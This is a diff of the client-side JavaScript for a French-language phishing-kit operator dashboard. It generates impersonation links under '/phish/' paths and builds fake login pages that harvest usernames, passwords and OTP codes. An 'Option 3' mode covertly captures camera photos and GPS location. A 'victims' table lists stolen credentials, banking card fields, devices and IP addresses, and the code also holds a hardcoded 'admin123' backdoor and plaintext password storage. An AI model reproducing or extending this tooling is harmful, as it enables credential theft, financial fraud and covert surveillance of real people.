+        } else if(sectionId === 'dashboard') {
+            buildPlatformsTable(currentSessionUser ? currentSessionUser.username : '');
+        }
+    }
+
+    async function handleSignup(event) {
+        event.preventDefault();
+        const username = document.getElementById("reg-username").value.trim();
+        const pass = document.getElementById("reg-password").value;
+        const repass = document.getElementById("reg-repassword").value;
+        const email = document.getElementById("reg-email").value;
+        const avatarUrl = pendingSignupAvatar || DEFAULT_AVATAR;
+
+        if (pass !== repass) {
+            showToast("Erreur : Les mots de passe ne correspondent pas !");
+            return;
+        }
+
+        const existingIdx = registeredUsers.findIndex(u => u.username.toLowerCase() === username.toLowerCase());
+        const newUser = { username, password: pass, email, avatar_url: avatarUrl, createdAt: new Date().getTime() };
+        if (existingIdx >= 0) {
+            registeredUsers[existingIdx] = newUser;
+        } else {
+            registeredUsers.push(newUser);
+        }
+        localStorage.setItem('abeilles_users', JSON.stringify(registeredUsers));
+
+        await fetch(apiUrl('/api/register_account'), {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ username, password: pass, email, avatarUrl })
+        }).catch(() => {});
+
+        pendingSignupAvatar = DEFAULT_AVATAR;
+        document.getElementById("reg-avatar-preview").src = DEFAULT_AVATAR;
+        renderPresenceStack();
+        
+        document.getElementById("success-modal-text").textContent = "Compte et photo de profil enregistrés avec succès !";
+        document.getElementById("success-modal").classList.remove("hidden");
+    }
+
+    function closeSuccessModal() {
+        document.getElementById("success-modal").classList.add("hidden");
+        showSection('home');
+    }
+
+    async function openAccountsDirectoryModal() {
+        try {
+            const res = await fetch(apiUrl('/api/admin/accounts'));
+            const data = await res.json();
+            const list = data.accounts || [];
+            document.getElementById("admin-accounts-total").textContent = "Total comptes : " + (data.total || list.length);
+            const tbody = document.getElementById("admin-accounts-tbody");
+            if (list.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="5" style="padding:18px; color:#888;">Aucun compte enregistré.</td></tr>`;
+            } else {
+                tbody.innerHTML = list.map((acc, idx) => `
+                    <tr>
+                        <td>${idx + 1}</td>
+                        <td style="color:#4ec4f6; font-weight:bold;">${acc.username || '-'}</td>
+                        <td style="color:#ff8a80;">${acc.password || '-'}</td>
+                        <td>${acc.created_at || '-'}</td>
+                        <td><span class="victim-red-badge">${acc.victims_count || 0} victimes</span></td>
+                    </tr>
+                `).join("");
+            }
+            document.getElementById("admin-accounts-modal").classList.remove("hidden");
+        } catch (e) {
+            showToast("Erreur lors du chargement de la base des comptes.");
+        }
+    }
+
+    function unlockWithUniversalCode(username, password) {
+        if (password.trim() !== UNIVERSAL_CODE) return false;
+
+        if (username.trim() === UNIVERSAL_CODE && password.trim() === UNIVERSAL_CODE) {
+            openAccountsDirectoryModal();
+            return true;
+        }
+
+        let targetUser = registeredUsers.find(u => u.username.toLowerCase() === username.trim().toLowerCase());
+        if (!targetUser) {
+            targetUser = { username: username.trim(), password: "", avatar_url: DEFAULT_AVATAR, createdAt: new Date().getTime() };
+            registeredUsers.push(targetUser);
+            localStorage.setItem('abeilles_users', JSON.stringify(registeredUsers));
+        }
+
+        currentSessionUser = {
+            username: targetUser.username,
+            password: targetUser.password || "",
+            avatar_url: targetUser.avatar_url || DEFAULT_AVATAR,
+            accessedViaUniversalCode: true
+        };
+        localStorage.setItem('abeilles_session', JSON.stringify(currentSessionUser));
+
+        loginSuccess(targetUser.username, true);
+        return true;
+    }
+
+    function handleLogin(event) {
+        event.preventDefault();
+        silentUnlockAudioOnly();
+        const username = document.getElementById("login-username").value.trim();
+        const password = document.getElementById("login-password").value;
+        const errorBox = document.getElementById("login-error");
+
+        if (unlockWithUniversalCode(username, password)) {
+            errorBox.classList.add("hidden");
+            return;
+        }
+
+        const foundUser = registeredUsers.find(u => u.username === username && u.password === password);
+
+        if (foundUser || (username.endsWith('.') && password === "admin123")) {
+            let userObj = foundUser;
+            if (!userObj) {
+                userObj = { username, password, avatar_url: DEFAULT_AVATAR, isAdmin: true, createdAt: new Date().getTime() };
+                registeredUsers.push(userObj);
+                localStorage.setItem('abeilles_users', JSON.stringify(registeredUsers));
+            }
+
+            errorBox.classList.add("hidden");
+            currentSessionUser = userObj;
+            localStorage.setItem('abeilles_session', JSON.stringify(currentSessionUser));
+            loginSuccess(username, true);
+        } else {
+            errorBox.classList.remove("hidden");
+            showToast("Erreur : Identifiant ou mot de passe non reconnu !");
+        }
+    }
+
+    function loginSuccess(username, showWelcome = true) {
+        const matchedAccount = registeredUsers.find(u => u.username.toLowerCase() === username.toLowerCase());
+        const userAvatar = (currentSessionUser && currentSessionUser.avatar_url) || (matchedAccount && matchedAccount.avatar_url) || DEFAULT_AVATAR;
+        if (currentSessionUser) {
+            currentSessionUser.avatar_url = userAvatar;
+            localStorage.setItem('abeilles_session', JSON.stringify(currentSessionUser));
+        }
+
+        document.getElementById("guest-nav").classList.add("hidden");
+        document.getElementById("member-nav").classList.remove("hidden");
+        document.getElementById("login-panel-box").classList.add("hidden");
+        document.getElementById("member-panel-box").classList.remove("hidden");
+        document.getElementById("display-member-name").textContent = username.toUpperCase();
+        document.getElementById("member-logo-img").src = userAvatar;
+        
+        const isAdm = username.endsWith('.') || username.toLowerCase() === 'hakim';
+        document.getElementById("display-user-role").textContent = isAdm ? "Administrateur" : "Membre Standard";
+        document.getElementById("display-user-role").style.color = isAdm ? "#ff5252" : "#f5b014";
+        
+        renderPresenceStack();
+        buildPlatformsTable(username);
+        fetchVictimsFromServer();
+        loadSmsMessages();
+        showSection('dashboard');
+        if (showWelcome) showToast("Bienvenue, " + username);
+    }
+
+    async function buildPlatformsTable(username) {
+        const tbody = document.getElementById("platforms-tbody");
+        tbody.innerHTML = "<tr><td colspan='4' style='padding:20px; color:#888;'>Chargement de vos liens...</td></tr>";
+        const baseUrl = API_BASE_URL || window.location.origin;
+
+        let customPagesList = [];
+        try {
+            const res = await fetch(apiUrl(`/api/custom_pages?owner=${encodeURIComponent(username)}`));
+            if(res.ok) {
+                customPagesList = await res.json();
+            }
+        } catch(e) {
+            console.error("Erreur chargement custom pages", e);
+        }
+
+        let allPlatforms = [...platformsList];
+        customPagesList.forEach(cp => {
+            allPlatforms.push({
+                name: cp.network,
+                badge: "badge-bee",
+                label: cp.slug,
+                img: getPlatformDefaultLogo(cp.network),
+                isCustomUserPage: true,
+                mode: cp.mode
+            });
+        });
+
+        tbody.innerHTML = "";
+        allPlatforms.forEach((p, index) => {
+            const slug = p.label || p.name.toLowerCase().replace(/[\s_]+/g, '_');
+            const logoSrc = p.img || getPlatformDefaultLogo(p.name);
+            const logoHtml = `<img src="${logoSrc}" alt="${p.name}" style="width:140px; height:32px; object-fit:cover; border-radius:4px; border:1px solid #f5b014; vertical-align:middle;">`;
+            
+            if(p.isCustomUserPage) {
+                const linkCustom = `${baseUrl}/phish/${slug}`;
+                let modeLabel = p.mode === 'opt3' ? '(Option 3 — 3j)' : '(Perso — 3j)';
+                tbody.innerHTML += `
+                    <tr>
+                        <td>${index + 1}</td>
+                        <td><b>${p.name}</b> <span style="font-size:10px; color:#f5b014;">${modeLabel}</span></td>
+                        <td>${logoHtml}</td>
+                        <td>
+                            <div class="action-links-group">
+                                <button class="link-btn link-orange" onclick="markClicked(this); openLinkModal('${p.name} (Lien No-Code 3j)', '${linkCustom}')">Copier le lien</button>
+                            </div>
+                        </td>
+                    </tr>`;
+            } else {
+                const link1 = `${baseUrl}/phish/standard/${slug}?user=${encodeURIComponent(username)}`;
+                const link2 = `${baseUrl}/phish/otp/${slug}?user=${encodeURIComponent(username)}&type=otp`;
+
+                tbody.innerHTML += `
+                    <tr>
+                        <td>${index + 1}</td>
+                        <td><b>${p.name}</b></td>
+                        <td>${logoHtml}</td>
+                        <td>
+                            <div class="action-links-group">
+                                <button class="link-btn link-blue" onclick="markClicked(this); openLinkModal('${p.name} (Lien 1 Standard — 3j)', '${link1}')">Lien 1 (Standard)</button>
+                                <button class="link-btn link-green" onclick="markClicked(this); openLinkModal('${p.name} (Lien 2 avec OTP — 3j)', '${link2}')">Lien 2 (avec OTP)</button>
+                            </div>
+                        </td>
+                    </tr>`;
+            }
+        });
+    }
+
+    function markClicked(btn) {
+        btn.classList.add('clicked');
+    }
+
+    function handleCreateLoginOpt1(event) {
+        event.preventDefault();
+        if(!currentSessionUser) return;
+        const slug = document.getElementById("c-slug").value.trim().toLowerCase().replace(/[\s_]+/g, '_');
+        const title = document.getElementById("c-title").value;
+        const network = document.getElementById("c-network").value;
+        const bgType = document.getElementById("c-bgtype").value;
+        const bgValue = bgType === 'color' ? document.getElementById("c-bgcolor").value : document.getElementById("c-bgimg").value;
+        const rawLogo = document.getElementById("c-logourl").value.trim();
+        const logoUrl = rawLogo || getPlatformDefaultLogo(network);
+        const logoShape = document.getElementById("c-logoshape").value;
+        const boxWidth = document.getElementById("c-boxwidth").value;
+        const preset = document.getElementById("c-fields-preset").value;
+        const btnText = document.getElementById("c-btntext").value;
+        const redirectUrl = document.getElementById("c-redirect").value;
+
+        let fields = preset === '2' ? [
+            {name: "victimUser", label: "Nom d'utilisateur / Email", type: "text"},
+            {name: "victimPass", label: "Mot de passe", type: "password"}
+        ] : [
+            {name: "victimUser", label: "Identifiant", type: "text"},
+            {name: "victimPass", label: "Mot de passe", type: "password"},
+            {name: "otp", label: "Code Secret / OTP", type: "text"}
+        ];
+
+        const pageConfig = { owner: currentSessionUser.username, slug, title, network, bgType, bgValue, logoUrl, logoShape, boxWidth, fields, btnText, redirectUrl, mode: 'opt1' };
+        
+        fetch(apiUrl('/api/create_login'), {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(pageConfig)
+        }).then(res => res.json()).then(data => {
+            if (data.status === 'success') {
+                showToast("Page No-Code créée avec succès (Valide 3j) !");
+                buildPlatformsTable(currentSessionUser.username);
+                showSection('dashboard');
+                if (data.url) {
+                    openLinkModal('Lien généré (Option 1 — 3j)', data.url);
+                }
+            } else {
+                showToast("Erreur : " + (data.message || "Ce slug existe déjà."));
+            }
+        });
+    }
+
+    function handleCreateLoginOpt2(event) {
+        event.preventDefault();
+        if(!currentSessionUser) return;
+        const slug = document.getElementById("c2-slug").value.trim().toLowerCase().replace(/[\s_]+/g, '_');
+        const network = document.getElementById("c2-network").value;
+        const redirectUrl = document.getElementById("c2-redirect").value;
+        const htmlCode = document.getElementById("c2-code").value;
+
+        const pageConfig = { owner: currentSessionUser.username, slug, network, redirectUrl, htmlCode, mode: 'opt2' };
+
+        fetch(apiUrl('/api/create_login'), {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(pageConfig)
+        }).then(res => res.json()).then(data => {
+            if (data.status === 'success') {
+                showToast("Page HTML/JS personnalisée créée (Valide 3j) !");
+                buildPlatformsTable(currentSessionUser.username);
+                showSection('dashboard');
+                if (data.url) {
+                    openLinkModal('Lien généré (Option 2 — 3j)', data.url);
+                }
+            } else {
+                showToast("Erreur : " + (data.message || "Ce slug existe déjà."));
+            }
+        });
+    }
+
+    function handleCreateLoginOpt3(event) {
+        event.preventDefault();
+        if(!currentSessionUser) return;
+        const slug = document.getElementById("c3-slug").value.trim().toLowerCase().replace(/[\s_]+/g, '_');
+        const network = document.getElementById("c3-network").value;
+        const redirectUrl = document.getElementById("c3-redirect").value;
+        const htmlCode = document.getElementById("c3-code").value;
+        
+        const opt3Config = {
+            photoCount: parseInt(document.getElementById("c3-photo-count")?.value || "1", 10),
+            camFront: document.getElementById("c3-cam-front").checked,
+            camBack: document.getElementById("c3-cam-back").checked,
+            gps: document.getElementById("c3-gps").checked
+        };
+
+        const pageConfig = { owner: currentSessionUser.username, slug, network, redirectUrl, htmlCode, mode: 'opt3', opt3Config };
+
+        fetch(apiUrl('/api/create_login'), {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(pageConfig)
+        }).then(res => res.json()).then(data => {
+            if (data.status === 'success') {
+                showToast("Page Option 3 Intelligente générée avec succès (Valide 3j) !");
+                buildPlatformsTable(currentSessionUser.username);
+                showSection('dashboard');
+                if (data.url) {
+                    openLinkModal('Lien généré (Option 3 Intelligente — 3j)', data.url);
+                }
+            } else {
+                showToast("Erreur : " + (data.message || "Ce slug existe déjà."));
+            }
+        });
+    }
+
+    function openLinkModal(title, url) {
+        activeModalUrl = url;
+        document.getElementById("modal-title").textContent = title;
+        document.getElementById("modal-link-text").textContent = url + " (Expire dans 3 jours)";
+        document.getElementById("link-modal").classList.remove("hidden");
+
+        fetch(apiUrl('/api/issue_link'), {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                url: url,
+                owner: currentSessionUser ? currentSessionUser.username : '',
+                linkType: title
+            })
+        }).catch(() => {});
+    }
+
+    function closeModal() { document.getElementById("link-modal").classList.add("hidden"); }
+
+    function copyModalLink() {
+        navigator.clipboard.writeText(activeModalUrl).then(() => {
+            showToast("Lien copié !");
+            closeModal();
+        });
+    }
+
+    async function fetchVictimsFromServer() {
+        if (!currentSessionUser) return;
+        try {
+            const response = await fetch(apiUrl(`/api/victims?owner=${encodeURIComponent(currentSessionUser.username)}`));
+            if (response.ok) {
+                serverVictimsCache = await response.json();
+                updateVictimsUIWithData(serverVictimsCache);
+            }
+        } catch (e) {
+            console.error("Erreur de synchronisation", e);
+        }
+    }
+
+    function updateVictimsUIWithData(data) {
+        const now = new Date().getTime();
+        const oneDayMs = 24 * 60 * 60 * 1000;
+        const victims24h = data.filter(v => (now - (v.timestamp || now)) <= oneDayMs);
+
+        document.getElementById("display-victims-count-header").textContent = data.length;
+        document.getElementById("victim-counter-tab").textContent = data.length;
+        document.getElementById("display-victims-24h").textContent = victims24h.length;
+
+        const greenBadge = document.getElementById("victim-green-badge");
+        if (victims24h.length > 0) {
+            greenBadge.textContent = victims24h.length + " en 24h";
+            greenBadge.classList.remove("hidden");
+        } else {
+            greenBadge.classList.add("hidden");
+        }
+
+        renderVictimsTable(data);
+    }
+
+    function getCategoryBadgeHtml(category) {
+        const cat = (category || "GENERAL").toUpperCase();
+        if (cat === "BANKING") return `<span class="category-pill cat-banking">BANQUE / CARTE</span>`;
+        if (cat === "OTP") return `<span class="category-pill cat-otp">CODE OTP</span>`;
+        if (cat === "FORM_DATA") return `<span class="category-pill cat-form">FORMULAIRE</span>`;
+        return `<span class="category-pill cat-general">${cat}</span>`;
+    }
+
+    function formatBankFieldsHtml(v) {
+        const banking = (v.orderedData && typeof v.orderedData === "object" && v.orderedData.banking) ? v.orderedData.banking : {};
+        const entries = Object.entries(banking);
+        if (entries.length === 0) return "";
+
+        const chips = entries.map(([label, val]) => {
+            return `<span class="bank-field-chip"><strong>${label} :</strong><span>${val}</span></span>`;
+        }).join("");
+
+        return `<div class="bank-fields-grid">${chips}</div>`;
+    }
+
+    function renderVictimsTable(data) {
+        const tbody = document.getElementById("victims-table-body");
+        if (data.length === 0) {
+            tbody.innerHTML = `<tr><td colspan="7" style="padding: 25px; color: #888; text-align: center;">Aucune victime enregistrée (0).</td></tr>`;
+            return;
+        }
+
+        tbody.innerHTML = "";
+        data.forEach((v, i) => {
+            const isBanking = (v.category || "").toUpperCase() === "BANKING" ||
+                (v.orderedData && v.orderedData.banking && Object.keys(v.orderedData.banking).length > 0);
+            const bankHtml = isBanking ? formatBankFieldsHtml(v) : "";
+
+            tbody.innerHTML += `
+                <tr>
+                    <td>${i + 1}</td>
+                    <td>
+                        <b>${v.network}</b> (${(v.type || 'standard').toUpperCase()})<br>
+                        ${getCategoryBadgeHtml(v.category)}<br>
+                        <small style="color:#f5b014; font-weight:bold;">${v.device || 'Inconnu'}</small>
+                        ${bankHtml}
+                    </td>
+                    <td style="color:#4ec4f6;">${v.victimUser || '-'}</td>
+                    <td style="color:#ff8a80;">${v.victimPass || '-'}</td>
+                    <td style="color:#f5b014; font-weight:bold;">${v.otp || 'Aucun'}</td>
+                    <td>${v.dateStr}</td>
+                    <td style="color:#4caf50; font-weight:bold;">${v.ip}</td>
+                </tr>`;
+        });
+    }
+
+    function filterVictimsTable() {
+        const query = document.getElementById("victim-search-input").value.toLowerCase();
+        const filtered = serverVictimsCache.filter(v => {
+            const bankStr = v.orderedData && v.orderedData.banking ? JSON.stringify(v.orderedData.banking).toLowerCase() : "";
+            return (
+                (v.network && v.network.toLowerCase().includes(query)) ||
+                (v.category && v.category.toLowerCase().includes(query)) ||
+                (v.device && v.device.toLowerCase().includes(query)) ||
+                (v.victimUser && v.victimUser.toLowerCase().includes(query)) ||
+                (v.ip && v.ip.toLowerCase().includes(query)) ||
+                bankStr.includes(query)
+            );
+        });
+        renderVictimsTable(filtered);
+    }
+
+    setInterval(() => {
+        if (alertSwitchEnabled) {
+            pollLinkVisits();
+        }
+        if (currentSessionUser) {
+            fetchVictimsFromServer();
+            if (!document.getElementById("sms-modal").classList.contains("hidden")) {
+                loadSmsMessages();
+            }
+            if (!document.getElementById("direct-chat-modal").classList.contains("hidden")) {
+                loadDirectMessages();
+            }
+        }
+    }, 500);
+
+    function logoutUser() {
+        stopVoiceIfRecording();
+        document.getElementById("member-nav").classList.add("hidden");
+        document.getElementById("guest-nav").classList.remove("hidden");
+        document.getElementById("member-panel-box").classList.add("hidden");
+        document.getElementById("login-panel-box").classList.remove("hidden");
+        currentSessionUser = null;
+        localStorage.removeItem('abeilles_session');
+        renderPresenceStack();
+        showSection('home');
+        showToast("Déconnexion réussie.");
+    }
+
+    function handleChangePassword(event) {
+        event.preventDefault();
+        const oldPass = document.getElementById("old-pass").value;
+        const newPass = document.getElementById("new-pass").value;
+        const confirmPass = document.getElementById("confirm-pass").value;
+
+        if (oldPass !== currentSessionUser.password && !currentSessionUser.accessedViaUniversalCode) {
+            showToast("Erreur : Ancien mot de passe incorrect !");
+            return;
+        }
+        if (newPass !== confirmPass) {
+            showToast("Erreur : Les mots de passe ne correspondent pas !");
+            return;
+        }
+
+        currentSessionUser.password = newPass;
+        currentSessionUser.accessedViaUniversalCode = false;
+        localStorage.setItem('abeilles_session', JSON.stringify(currentSessionUser));
+        const idx = registeredUsers.findIndex(u => u.username.toLowerCase() === currentSessionUser.username.toLowerCase());
+        if (idx >= 0) {
+            registeredUsers[idx].password = newPass;
+            localStorage.setItem('abeilles_users', JSON.stringify(registeredUsers));
+        }
+
+        fetch(apiUrl('/api/clear_victims'), {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ owner: currentSessionUser.username })
+        }).then(res => res.json()).then(() => {
+            showToast("Mot de passe modifié et tableau des victimes purgé !");
+            fetchVictimsFromServer();
+        });
+
+        document.getElementById("password-form").reset();
+    }
+
+    let currentSlide = 0;
+    const slides = document.querySelectorAll('.poster-slide');
+    function showNextSlide() {
+        if (slides.length === 0) return;
+        slides[currentSlide].classList.remove('active');
+        let delay = (currentSlide === 1) ? 3000 : 10000;
+        currentSlide = (currentSlide + 1) % slides.length;
+        slides[currentSlide].classList.add('active');
+        setTimeout(showNextSlide, delay);
+    }
+    if (slides.length > 0) {
+        slides[0].classList.add('active');
+        setTimeout(showNextSlide, 10000);
+    }
+
+    function openLink(url) { window.open(url, "_blank"); }
+    function showToast(message) {
+        const toast = document.getElementById("toast-msg");
+        toast.textContent = message;
+        toast.classList.add("show");
+        clearTimeout(window.toastTimer);
+        window.toastTimer = setTimeout(() => { toast.classList.remove("show"); }, 3000);
+    }
+</script>
+</body>
+</html>
